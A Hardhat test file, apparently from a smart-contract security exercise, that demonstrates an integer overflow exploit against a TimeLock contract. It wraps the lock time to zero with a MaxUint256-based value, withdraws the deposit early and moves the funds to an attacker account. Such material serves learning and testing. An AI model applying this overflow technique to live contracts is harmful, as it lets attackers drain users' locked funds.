import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();

describe("Arthemetic overflow / underflow ",function(){

    let deployer:any,victim:any,attacker:any;
    const ONE_MONTH = 30 * 24 * 60 * 60;
    const VICTIM_DEPOSIT = ethers.parseEther("100");

    before(async function(){

        [deployer,victim,attacker] = await ethers.getSigners();
        this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
        this.victimInitialBalance = await ethers.provider.getBalance(victim.address);

        const TimeLockFactory = await ethers.getContractFactory("TimeLock",deployer);
        this.timelock = await TimeLockFactory.deploy();

        await this.timelock.waitForDeployment();

        await this.timelock.connect(victim).depositEth({value:VICTIM_DEPOSIT});
        let currentBalance = await ethers.provider.getBalance(victim.address);

        expect(currentBalance).to.be.lt(this.victimInitialBalance - VICTIM_DEPOSIT);

        let block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
        let blockTimeStamp = block?.timestamp;

        let victimDeposited = await this.timelock.connect(victim).getBalance(victim.address);
        let lockTime = await this.timelock.connect(victim).getLockTime(victim.address);

        expect(victimDeposited).to.equal(VICTIM_DEPOSIT);

    });

    it("Exploit integer overflow",async function(){
        let currentLockTime = await this.timelock.getLockTime(victim.address);
       const timetoadd = (ethers.MaxUint256 + 1n) - currentLockTime;
        await this.timelock.connect(victim).increaseLockTime(timetoadd);
        await this.timelock.connect(victim).withdrawEth();
        await victim.sendTransaction({
            to:attacker.address,
            value:VICTIM_DEPOSIT
        });

    });


    after(async function(){
        let victimDepositedAfter = await this.timelock.connect(victim).getBalance(victim.address);
        expect(victimDepositedAfter).to.equal(0);

        let attackerCurrentBalance = await ethers.provider.getBalance(attacker.address);

        expect(attackerCurrentBalance).to.be.gt(
            this.attackerInitialBalance + VICTIM_DEPOSIT - (ethers.parseEther("0.2"))
        );
    })
});